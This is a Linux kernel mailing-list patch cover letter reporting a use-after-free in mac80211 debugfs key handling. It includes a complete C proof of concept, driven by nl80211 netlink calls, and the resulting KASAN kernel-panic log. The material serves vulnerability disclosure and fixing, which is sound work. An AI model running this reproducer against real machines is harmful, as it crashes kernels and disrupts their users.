Received: from mail-pg1-f170.google.com (mail-pg1-f170.google.com [209.85.215.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 358894477F3
	for <linux-wireless@vger.kernel.org>; Mon,  7 Sep 2026 12:27:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.170
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788784048; cv=none; b=KgTAMffU15edDixvU/hLVK65aw5RjdhGDZt+CDt0fUl2QVDRFfZFzs/Sftah6JFHA9du1t0icd7G32vffSKcXvehJ0PeYOO/wSYRcKSVn60epWI4UM8wF6D8JknItyyi6YL28aV+WVCQZUfptjC1HkkFSFfbCwj6e4lD+6yxoCQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788784048; c=relaxed/simple;
	bh=blyKrfANhD3NPUbEXm59hw1j07YMb5bNPWqFnxlRknw=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=HGxppJxHg67BI4XmuPfwnHS4z83+uucilniHetyt9uQnmUfNuQRRka9nJ49pnFqXjmRk3sypErBca8KD7FupCH2ViVNcOfkrDtSPrLdE/dpZ7QF1J1/PfDHUvc+8cXJ9SXoQCRdBmmNUkpzjWwzKzbX/poWUJvwy5GKQGhtbl0M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=KMFxHbUK; arc=none smtp.client-ip=209.85.215.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="KMFxHbUK"
Received: by mail-pg1-f170.google.com with SMTP id 41be03b00d2f7-ca80d708489so2512952a12.1
        for <linux-wireless@vger.kernel.org>; Mon, 07 Sep 2026 05:27:26 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788784045; x=1789388845; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Mo9pQT7K4lvnrNrtwgCS5Cx6UVc4ZEaPfIbgvoMfd8M=;
        b=KMFxHbUKPkPpriQcmSW0QnditzNc7l3lYGpUL/4BFdEyFIllaTGcFewn/+m7csrpur
         McI6H/8WUuPm/gqar8Gc0CiCATfAACyr0kkbZzzm8OgEHzvQEhtIlTca3u70spYVX3a3
         +CsV/n9sUBpkE10xAT46w1OWqCxbFqLlfWQM/5y26FUD418IC8gW2KpU5M544UUcE7fB
         g345WwIjEjakBdK/ccDqRrZ8xyHbAvnKWp0YWuanvMJSMTIhFCOOvM/YHJgY07iisJcU
         1SYPUjO7feTMwvGE5KTqBIpLCWQautYQWlza5sUFy9lmmtRfzIe0ZvJYEpr6D4Uulz2m
         h9aQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788784045; x=1789388845;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Mo9pQT7K4lvnrNrtwgCS5Cx6UVc4ZEaPfIbgvoMfd8M=;
        b=smnuZg1FXqAoruO1icBrmcfPnetW3xvM88og/41TbFfGRxXSgbtGWIezc4ky7mOwcU
         nIkabjMa7ngi6SjLgbLZ4kBTtF4jm19D323e72O7SF4zG6zGfNhVxJ8tjsfhSG78MGsh
         rxOjMuQGXzmmG7BqF8LPcnAnaqoCGtlM+GhzG5mQOX7UJi3Qr+DUPMXfFT8XDfuywCfj
         CjlzC8Vt0G2e0U75e/uHgFHnO/xAEd4PEEoN9RvS7pwpclQ+IvEZjLqyKUCZ1pwfssAP
         hMbnlT7mGObCAjNWXYtSumd6fHMxHIBY6n2F6b8xs9QYQBLVQ3B8X1mpeQg+vTs6rF/R
         ZpOQ==
X-Gm-Message-State: AFuF++nZvjpcXoOkICEPDNhg/IZDpGfHCjw7k97vsXU+s6Y2Sq0W/96M
	+xaEFJ2sAl46RBW7ngL/8ob8GwWht6Vep53hQ2GsHX/nOnGj9OxTZGQx+kF9bbfcAqWNfN/D9di
	QAWJ2Bg==
X-Gm-Gg: AYBFou0pzbYMvBf6GrKLqK+o+ej03uzxzhBjmiqOj7VOvdY3+5L3uemWJFy1ToP2VRp
	fKSWzel9N+iMIWrvjVzlJ+N5QrU95LEKJX30NF/r+P08JStLdXlOB5LIuAkISsDV43UIU2nylTe
	uh35jXR8fUhRUya+aQ2X/FllDZ8h3iNNeY7wSYHppKH4ZvFIvKbkNkggtHHCPMC81B8HXJ8w5sj
	tLEWoUv7HXTNWQRi9CeTjyt58eO0qgKKh7zwNEsysunJJcS8g9NMGl9pW3GENA/lm/CAgIRFkK/
	IvIysrMGCdbc7/+QpD+PIGXtclK+aXm0eLb7jISyl03KITCnS4l8Q+VtnfL/zQpZGz61WyEnr4Z
	I2LBZ6ZDzyiMZqw3rjzA77/ebF63Qje1qeaV0jUDxZUsFzL5jLNYNo3EE6GTwCA/H6JthuXSggR
	AAUbLYNDR0hBBKruEIvBBx2D9oIWpJ81icsCmZzKJxVk4Tp7r+dFNFY0IfqOQO7SBqDtsh
X-Received: by 2002:a17:90a:c88f:b0:380:8bb9:aba9 with SMTP id 98e67ed59e1d1-39b07f3216bmr30941126a91.3.1788784045099;
        Mon, 07 Sep 2026 05:27:25 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1432435648esm32122104c88.5.2026.09.07.05.27.22
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 07 Sep 2026 05:27:24 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-wireless@vger.kernel.org
Cc: johannes@sipsolutions.net,
	gregory.greenman@intel.com,
	miriam.rachel.korenblit@intel.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH wireless 0/1] wifi: mac80211: reset default-key debugfs after netdev recreate
Date: Mon,  7 Sep 2026 20:27:12 +0800
Message-ID: <cover.1788783312.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/mac80211/debugfs_key.c and
net/mac80211/debugfs_netdev.c. The bug is reachable by a root user.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

ieee80211_debugfs_key_update_default() keeps dentry pointers for the
default unicast and multicast key symlinks.
ieee80211_debugfs_recreate_netdev() can recursively remove the parent
netdev debugfs directory while those keys remain installed, for example
when adding the first MLO link. It clears the parent and stations
pointers, but not the child key dentries, then creates a new parent
directory.

A later default-key update passes the freed dentries to debugfs_remove().
That is a use-after-free.

Clear the stale default-key dentry pointers when the netdev debugfs tree
is removed, and recreate the symlinks after the directory is rebuilt.

Reproducer:

    make
    ./poc.sh wlan0

The kernel must be booted with mac80211_hwsim.mlo=1.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

    #define _GNU_SOURCE
    
    #include <errno.h>
    #include <linux/nl80211.h>
    #include <net/ethernet.h>
    #include <net/if.h>
    #include <netlink/attr.h>
    #include <netlink/genl/ctrl.h>
    #include <netlink/genl/genl.h>
    #include <netlink/msg.h>
    #include <netlink/netlink.h>
    #include <stdbool.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/ioctl.h>
    #include <sys/socket.h>
    #include <unistd.h>
    
    #ifndef WLAN_CIPHER_SUITE_WEP40
    #define WLAN_CIPHER_SUITE_WEP40 0x000FAC01
    #endif
    
    static int ack_error_cb(struct sockaddr_nl *nla, struct nlmsgerr *err, void *arg)
    {
    	(void)nla;
    	*(int *)arg = err->error;
    	return NL_STOP;
    }
    
    static int ack_cb(struct nl_msg *msg, void *arg)
    {
    	(void)msg;
    	*(int *)arg = 0;
    	return NL_STOP;
    }
    
    static int finish_cb(struct nl_msg *msg, void *arg)
    {
    	(void)msg;
    	(void)arg;
    	return NL_SKIP;
    }
    
    static int no_seq_check_cb(struct nl_msg *msg, void *arg)
    {
    	(void)msg;
    	(void)arg;
    	return NL_OK;
    }
    
    static int nl_talk(struct nl_sock *sock, struct nl_msg *msg)
    {
    	struct nl_cb *cb;
    	int err = 1;
    
    	if (nl_send_auto(sock, msg) < 0)
    		return -EIO;
    
    	cb = nl_cb_alloc(NL_CB_DEFAULT);
    	if (!cb)
    		return -ENOMEM;
    
    	nl_cb_set(cb, NL_CB_ACK, NL_CB_CUSTOM, ack_cb, &err);
    	nl_cb_set(cb, NL_CB_FINISH, NL_CB_CUSTOM, finish_cb, &err);
    	nl_cb_set(cb, NL_CB_SEQ_CHECK, NL_CB_CUSTOM, no_seq_check_cb, NULL);
    	nl_cb_err(cb, NL_CB_CUSTOM, ack_error_cb, &err);
    
    	while (err > 0) {
    		int rc = nl_recvmsgs(sock, cb);
    
    		if (rc < 0) {
    			err = rc;
    			break;
    		}
    	}
    
    	nl_cb_put(cb);
    	return err;
    }
    
    static int open_ioctl_socket(void)
    {
    	int fd = socket(AF_INET, SOCK_DGRAM, 0);
    
    	if (fd < 0)
    		perror("socket(AF_INET, SOCK_DGRAM)");
    	return fd;
    }
    
    static int set_if_updown(int fd, const char *ifname, bool up)
    {
    	struct ifreq ifr;
    
    	memset(&ifr, 0, sizeof(ifr));
    	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
    
    	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
    		perror("SIOCGIFFLAGS");
    		return -1;
    	}
    
    	if (up)
    		ifr.ifr_flags |= IFF_UP;
    	else
    		ifr.ifr_flags &= ~IFF_UP;
    
    	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
    		perror("SIOCSIFFLAGS");
    		return -1;
    	}
    
    	return 0;
    }
    
    static int set_iftype(struct nl_sock *sock, int family_id, int ifindex, int iftype)
    {
    	struct nl_msg *msg;
    	int err;
    
    	msg = nlmsg_alloc();
    	if (!msg)
    		return -ENOMEM;
    
    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
    			 NL80211_CMD_SET_INTERFACE, 0) ||
    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
    	    nla_put_u32(msg, NL80211_ATTR_IFTYPE, iftype)) {
    		nlmsg_free(msg);
    		return -NLE_MSGSIZE;
    	}
    
    	err = nl_talk(sock, msg);
    	nlmsg_free(msg);
    	return err;
    }
    
    static int new_key(struct nl_sock *sock, int family_id, int ifindex,
    		   int key_idx, const void *key_data, size_t key_len)
    {
    	struct nl_msg *msg;
    	int err;
    
    	msg = nlmsg_alloc();
    	if (!msg)
    		return -ENOMEM;
    
    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
    			 NL80211_CMD_NEW_KEY, 0) ||
    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
    	    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, key_idx) ||
    	    nla_put_u32(msg, NL80211_ATTR_KEY_CIPHER, WLAN_CIPHER_SUITE_WEP40) ||
    	    nla_put(msg, NL80211_ATTR_KEY_DATA, key_len, key_data)) {
    		nlmsg_free(msg);
    		return -NLE_MSGSIZE;
    	}
    
    	err = nl_talk(sock, msg);
    	nlmsg_free(msg);
    	return err;
    }
    
    static int set_default_key(struct nl_sock *sock, int family_id, int ifindex,
    			   int key_idx, int link_id)
    {
    	struct nl_msg *msg;
    	struct nlattr *types;
    	int err;
    
    	msg = nlmsg_alloc();
    	if (!msg)
    		return -ENOMEM;
    
    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
    			 NL80211_CMD_SET_KEY, 0) ||
    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
    	    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, key_idx) ||
    	    nla_put_flag(msg, NL80211_ATTR_KEY_DEFAULT)) {
    		nlmsg_free(msg);
    		return -NLE_MSGSIZE;
    	}
    
    	if (link_id >= 0 &&
    	    nla_put_u8(msg, NL80211_ATTR_MLO_LINK_ID, link_id)) {
    		nlmsg_free(msg);
    		return -NLE_MSGSIZE;
    	}
    
    	types = nla_nest_start(msg, NL80211_ATTR_KEY_DEFAULT_TYPES);
    	if (!types ||
    	    nla_put_flag(msg, NL80211_KEY_DEFAULT_TYPE_UNICAST) ||
    	    nla_put_flag(msg, NL80211_KEY_DEFAULT_TYPE_MULTICAST)) {
    		nlmsg_free(msg);
    		return -NLE_MSGSIZE;
    	}
    	nla_nest_end(msg, types);
    
    	err = nl_talk(sock, msg);
    	nlmsg_free(msg);
    	return err;
    }
    
    static int del_key(struct nl_sock *sock, int family_id, int ifindex,
    		   int key_idx, int link_id)
    {
    	struct nl_msg *msg;
    	int err;
    
    	msg = nlmsg_alloc();
    	if (!msg)
    		return -ENOMEM;
    
    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
    			 NL80211_CMD_DEL_KEY, 0) ||
    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
    	    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, key_idx)) {
    		nlmsg_free(msg);
    		return -NLE_MSGSIZE;
    	}
    
    	if (link_id >= 0 &&
    	    nla_put_u8(msg, NL80211_ATTR_MLO_LINK_ID, link_id)) {
    		nlmsg_free(msg);
    		return -NLE_MSGSIZE;
    	}
    
    	err = nl_talk(sock, msg);
    	nlmsg_free(msg);
    	return err;
    }
    
    static int add_link(struct nl_sock *sock, int family_id, int ifindex,
    		    int link_id, const unsigned char link_addr[ETH_ALEN])
    {
    	struct nl_msg *msg;
    	int err;
    
    	msg = nlmsg_alloc();
    	if (!msg)
    		return -ENOMEM;
    
    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
    			 NL80211_CMD_ADD_LINK, 0) ||
    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
    	    nla_put_u8(msg, NL80211_ATTR_MLO_LINK_ID, link_id) ||
    	    nla_put(msg, NL80211_ATTR_MAC, ETH_ALEN, link_addr)) {
    		nlmsg_free(msg);
    		return -NLE_MSGSIZE;
    	}
    
    	err = nl_talk(sock, msg);
    	nlmsg_free(msg);
    	return err;
    }
    
    int main(int argc, char **argv)
    {
    	static const unsigned char wep40_key[] = { 0x11, 0x22, 0x33, 0x44, 0x55 };
    	static const unsigned char link_addr[ETH_ALEN] = {
    		0x02, 0x00, 0x00, 0x00, 0x10, 0x01
    	};
    	const char *ifname = argc > 1 ? argv[1] : "wlan0";
    	struct nl_sock *sock;
    	int family_id;
    	int ifindex;
    	int fd;
    	int err;
    
    	ifindex = if_nametoindex(ifname);
    	if (!ifindex) {
    		fprintf(stderr, "if_nametoindex(%s): %s\n", ifname, strerror(errno));
    		return 1;
    	}
    
    	fd = open_ioctl_socket();
    	if (fd < 0)
    		return 1;
    
    	sock = nl_socket_alloc();
    	if (!sock) {
    		fprintf(stderr, "nl_socket_alloc failed\n");
    		return 1;
    	}
    
    	if (genl_connect(sock) < 0) {
    		fprintf(stderr, "genl_connect failed\n");
    		return 1;
    	}
    
    	nl_socket_set_buffer_size(sock, 8192, 8192);
    
    	family_id = genl_ctrl_resolve(sock, "nl80211");
    	if (family_id < 0) {
    		fprintf(stderr, "genl_ctrl_resolve(nl80211) failed: %d\n", family_id);
    		return 1;
    	}
    
    	printf("requires a booted kernel with mac80211_hwsim MLO enabled, e.g. mac80211_hwsim.mlo=1\n");
    
    	printf("[1/7] bring %s down\n", ifname);
    	if (set_if_updown(fd, ifname, false) < 0)
    		return 1;
    
    	printf("[2/7] change %s into an AP interface\n", ifname);
    	err = set_iftype(sock, family_id, ifindex, NL80211_IFTYPE_AP);
    	if (err < 0) {
    		fprintf(stderr, "NL80211_CMD_SET_INTERFACE failed: %s (%d)\n",
    			nl_geterror(err), err);
    		return 1;
    	}
    
    	printf("[3/7] bring %s up\n", ifname);
    	if (set_if_updown(fd, ifname, true) < 0)
    		return 1;
    
    	printf("[4/7] add WEP40 group key idx 0\n");
    	err = new_key(sock, family_id, ifindex, 0, wep40_key, sizeof(wep40_key));
    	if (err < 0) {
    		fprintf(stderr, "NL80211_CMD_NEW_KEY failed: %s (%d)\n",
    			nl_geterror(err), err);
    		return 1;
    	}
    
    	printf("[5/7] set key idx 0 as the default key on the deflink\n");
    	err = set_default_key(sock, family_id, ifindex, 0, -1);
    	if (err < 0) {
    		fprintf(stderr, "initial NL80211_CMD_SET_KEY failed: %s (%d)\n",
    			nl_geterror(err), err);
    		return 1;
    	}
    
    	printf("[6/7] add MLO link 1; this recreates the netdev debugfs tree while the key stays alive\n");
    	err = add_link(sock, family_id, ifindex, 1, link_addr);
    	if (err < 0) {
    		fprintf(stderr, "NL80211_CMD_ADD_LINK failed: %s (%d)\n",
    			nl_geterror(err), err);
    		return 1;
    	}
    
    	usleep(200000);
    
    	printf("[7/7] set the same default key again on link 1; this should hit the stale debugfs dentry\n");
    	err = set_default_key(sock, family_id, ifindex, 0, 1);
    	if (err < 0) {
    		fprintf(stderr, "second NL80211_CMD_SET_KEY failed: %s (%d)\n",
    			nl_geterror(err), err);
    		fprintf(stderr, "trying key deletion fallback\n");
    		err = del_key(sock, family_id, ifindex, 0, 1);
    		if (err < 0) {
    			fprintf(stderr, "NL80211_CMD_DEL_KEY failed: %s (%d)\n",
    				nl_geterror(err), err);
    			return 1;
    		}
    	}
    
    	printf("kernel survived the full sequence\n");
    	return 0;
    }

------END poc.c--------

----BEGIN crash log----

[  250.656715][T10485] page last allocated via order 1, migratetype Reclaimable, gfp_mask 0xd20d0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC|__GFP_RECLAIMABLE), pid 9087, tgid 9087 (rasdaemon), ts 169450826143, free_ts 64359481277
[  250.660265][T10485] page last free pid 1 tgid 1 stack trace:
[  250.661411][T10485] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  250.662509][T10485] CPU: 1 UID: 0 PID: 10485 Comm: poc Not tainted 6.12.95 #2
[  250.663587][T10485] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  250.665366][T10485] Call Trace:
[  250.665853][T10485]  <TASK>
[  250.666291][T10485]  panic+0x533/0x610
[  250.666881][T10485]  ? __pfx_panic+0x10/0x10
[  250.667530][T10485]  ? rcu_is_watching+0x12/0xc0
[  250.668241][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.669123][T10485]  ? __pfx_lock_release+0x10/0x10
[  250.669854][T10485]  ? __pfx__printk+0x10/0x10
[  250.670526][T10485]  ? print_report+0x2e5/0x620
[  250.671212][T10485]  ? __lock_acquire+0x2f4e/0x3c40
[  250.671949][T10485]  check_panic_on_warn+0x61/0x80
[  250.672689][T10485]  end_report+0x11b/0x180
[  250.673310][T10485]  kasan_report+0xe8/0x110
[  250.673968][T10485]  ? __lock_acquire+0x2f4e/0x3c40
[  250.674718][T10485]  __lock_acquire+0x2f4e/0x3c40
[  250.675429][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.676214][T10485]  ? hlock_class+0x4e/0x130
[  250.676883][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.677677][T10485]  ? __lock_acquire+0x1249/0x3c40
[  250.678420][T10485]  ? __pfx___lock_acquire+0x10/0x10
[  250.679171][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.679986][T10485]  ? hlock_class+0x4e/0x130
[  250.680655][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.681465][T10485]  ? __lock_acquire+0xc96/0x3c40
[  250.682184][T10485]  lock_acquire.part.0+0x119/0x370
[  250.682923][T10485]  ? lockref_get+0xd/0x50
[  250.683563][T10485]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  250.684384][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.685177][T10485]  ? rcu_is_watching+0x12/0xc0
[  250.685869][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.686664][T10485]  ? trace_lock_acquire+0x145/0x1c0
[  250.687409][T10485]  ? lockref_get+0xd/0x50
[  250.688083][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.688927][T10485]  ? lock_acquire+0x2f/0xb0
[  250.689580][T10485]  ? lockref_get+0xd/0x50
[  250.690210][T10485]  _raw_spin_lock+0x33/0x40
[  250.690979][T10485]  ? lockref_get+0xd/0x50
[  250.691616][T10485]  lockref_get+0xd/0x50
[  250.692302][T10485]  simple_recursive_removal+0x33/0x7e0
[  250.693079][T10485]  ? __pfx_remove_one+0x10/0x10
[  250.693786][T10485]  ? do_raw_spin_unlock+0x177/0x230
[  250.694557][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.695389][T10485]  ? _raw_spin_unlock+0x2d/0x50
[  250.696077][T10485]  debugfs_remove+0x44/0x70
[  250.696737][T10485]  ieee80211_debugfs_key_update_default+0x11c/0x6a0
[  250.697695][T10485]  ? __pfx_ieee80211_debugfs_key_update_default+0x10/0x10
[  250.698728][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.699552][T10485]  ? rcu_is_watching+0x12/0xc0
[  250.700230][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.701065][T10485]  ? __ieee80211_set_default_key+0x35d/0xa70
[  250.701993][T10485]  ieee80211_config_default_key+0x4c/0x60
[  250.702870][T10485]  nl80211_set_key+0x63d/0xd40
[  250.703564][T10485]  ? __pfx_nl80211_set_key+0x10/0x10
[  250.704324][T10485]  ? trace_kmalloc+0x2b/0xe0
[  250.705022][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.705844][T10485]  ? nl80211_pre_doit+0x588/0x800
[  250.706619][T10485]  genl_family_rcv_msg_doit+0x1e5/0x2d0
[  250.707430][T10485]  ? __pfx_genl_family_rcv_msg_doit+0x10/0x10
[  250.708323][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.709149][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.709962][T10485]  ? apparmor_capable+0xb9/0x180
[  250.710597][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.711234][T10485]  ? security_capable+0x8a/0x150
[  250.711814][T10485]  genl_rcv_msg+0x42d/0x6f0
[  250.712365][T10485]  ? __pfx_genl_rcv_msg+0x10/0x10
[  250.712971][T10485]  ? __pfx_nl80211_pre_doit+0x10/0x10
[  250.713611][T10485]  ? __pfx_nl80211_set_key+0x10/0x10
[  250.714219][T10485]  ? __pfx_nl80211_post_doit+0x10/0x10
[  250.714895][T10485]  ? __pfx___lock_acquire+0x10/0x10
[  250.715491][T10485]  ? find_held_lock+0x2d/0x110
[  250.716050][T10485]  netlink_rcv_skb+0x136/0x370
[  250.716619][T10485]  ? __pfx_genl_rcv_msg+0x10/0x10
[  250.717222][T10485]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  250.717891][T10485]  ? __pfx_netlink_rcv_skb+0x10/0x10
[  250.718500][T10485]  ? rwsem_read_trylock+0x130/0x250
[  250.719080][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.719749][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.720433][T10485]  ? down_read+0xcc/0x330
[  250.720936][T10485]  ? __pfx_down_read+0x10/0x10
[  250.721492][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.722125][T10485]  ? netlink_deliver_tap+0x14b/0xa80
[  250.722729][T10485]  genl_rcv+0x28/0x40
[  250.723191][T10485]  netlink_unicast+0x479/0x790
[  250.723764][T10485]  ? __pfx_netlink_unicast+0x10/0x10
[  250.724368][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.725034][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.725686][T10485]  ? __check_object_size+0x2eb/0x4f0
[  250.726295][T10485]  netlink_sendmsg+0x76e/0xc10
[  250.726851][T10485]  ? __pfx_netlink_sendmsg+0x10/0x10
[  250.727467][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.728101][T10485]  ? apparmor_socket_sendmsg+0x2e/0x200
[  250.728749][T10485]  ____sys_sendmsg+0x818/0xa10
[  250.729238][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.729626][T10485]  ? __pfx_____sys_sendmsg+0x10/0x10
[  250.729986][T10485]  ? __pfx_copy_msghdr_from_user+0x10/0x10
[  250.730394][T10485]  ? __lock_acquire+0x1249/0x3c40
[  250.730740][T10485]  ___sys_sendmsg+0x105/0x190
[  250.731059][T10485]  ? __pfx____sys_sendmsg+0x10/0x10
[  250.731407][T10485]  ? debug_object_free+0x299/0x500
[  250.731768][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.732134][T10485]  ? find_held_lock+0x2d/0x110
[  250.732488][T10485]  ? __might_fault+0xb6/0x120
[  250.732805][T10485]  __sys_sendmsg+0x122/0x1b0
[  250.733121][T10485]  ? __pfx___sys_sendmsg+0x10/0x10
[  250.733473][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.733905][T10485]  do_syscall_64+0xc7/0x270
[  250.734217][T10485]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  250.734638][T10485] RIP: 0033:0x7f5e8bcda687
[  250.734937][T10485] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  250.736229][T10485] RSP: 002b:00007ffc3d235470 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[  250.736810][T10485] RAX: ffffffffffffffda RBX: 00007f5e8bc49c40 RCX: 00007f5e8bcda687
[  250.737343][T10485] RDX: 0000000000000000 RSI: 00007ffc3d2354f0 RDI: 0000000000000004
[  250.737879][T10485] RBP: 000056101ab9d460 R08: 0000000000000000 R09: 0000000000000000
[  250.738411][T10485] R10: 0000000000000000 R11: 0000000000000202 R12: 000056101ab9d2a0
[  250.738964][T10485] R13: 00007ffc3d2354f0 R14: 0000000000000001 R15: 0000000000000000
[  250.739503][T10485]  </TASK>
[  250.739884][T10485] Kernel Offset: disabled
[  250.740191][T10485] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  wifi: mac80211: reset default-key debugfs after netdev recreate

 net/mac80211/debugfs_netdev.c | 4 ++++
 1 file changed, 4 insertions(+)

-- 
2.43.0
